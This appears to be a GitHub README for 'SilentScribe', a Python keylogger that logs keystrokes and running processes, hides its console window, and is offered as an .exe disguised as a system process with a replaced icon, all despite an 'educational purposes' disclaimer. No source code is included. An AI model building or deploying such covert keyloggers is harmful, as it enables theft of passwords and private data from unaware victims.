## About SilentScribe

SilentScribe is a simple Python script for logging keyboard events, including key presses and key combinations. It is designed for educational purposes or for personal use. Please be aware that using keyloggers for malicious purposes is illegal and unethical.

##  Features
* Records keyboard events and logs them with timestamps.
* Supports logging of key presses and key combinations (e.g., Ctrl+Alt+Delete).
* Periodically flushes the log buffer to a specified log file.
* Logs running processes along with their IDs and names.
* Runs as a background process.

#### The code automatically creates a text file in the directory with the script where it is located and keeps a detailed log of keystrokes and running processes. When launched, it logs all running processes once, and then only new ones.

## Installation

```
git clone https://github.com/AresTheG/SilentScribe.git
```
Install the required dependencies by running the following commands:

* Installation on Windows:

```
c:\python27\python.exe -m pip install keyboard psutil pywin32
```
* Installation on Linux:
```
sudo pip install keyboard psutil
```

## Recommended Python Version:

SilentScribe currently supports  **Python 3**.

## Dependencies:

### This code relies on the following libraries:
* keyboard: This library is used for registering keyboard events and capturing key presses.
* logging: It is a standard Python module used for logging and recording messages about events and errors.
* datetime: The datetime module is used for working with time and dates, including creating timestamps.
* time: The time module is used for working with time and delays.
* threading: This module allows you to create and manage execution threads in Python.
* win32console and win32gui: These modules from the pywin32 library are used for controlling the console window and hiding it from the user in Windows.
* psutil: The psutil library is used for obtaining information about running processes and their attributes.

## Usage
```
python SilentScribe.py
```
### Or start .exe file (disguised as a system process, even replacing the application icon)

## Development Instructions
* To make changes to the code, ensure that you have installed the necessary libraries and environment.

* After development, submit a pull request with a description of the changes made.

## License

SilentScribe is licensed under the GNU GPL license. take a look at the LICENSE for more information.

## Credits

The code is developed by Ares

## Version

**Current version is 1.0.0**
